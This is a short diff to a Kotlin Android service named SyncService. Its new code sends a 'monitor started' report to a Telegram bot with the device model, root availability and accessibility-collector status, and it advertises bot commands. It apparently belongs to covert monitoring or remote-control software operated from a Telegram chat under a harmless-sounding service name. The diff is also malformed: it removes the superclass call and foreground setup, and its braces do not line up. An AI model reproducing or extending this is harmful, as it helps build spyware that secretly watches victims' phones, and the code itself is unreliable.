@@ -64,20 +64,18 @@ class SyncService : Service() {
     }
 
     override fun onCreate() {
-        super.onCreate()
-        criarCanal()
-        iniciarForeground()
-
-        if (!Config.configurado()) {
-            Telegram.send("<b>Monitor iniciado</b>\nToken/chat não configurados.")
-        } else {
-            Telegram.send(
+executor.execute {
+            val texto = if (!Config.configurado()) {
+                "<b>Monitor iniciado</b>\nToken/chat não configurados."
+            } else {
                 "<b>Monitor iniciado</b>\n" +
                     "Modelo: ${Build.MANUFACTURER} ${Build.MODEL}\n" +
                     "Root: ${if (Root.disponivel()) "sim" else "não"}\n" +
                     "Acessibilidade: ${Collector.acessibilidadeAtiva(this)}\n" +
                     "Use /ajuda para os comandos."
-            )
+            }
+            Telegram.send(texto)
+}
         }
 
         handler.postDelayed(ciclo, 3000)
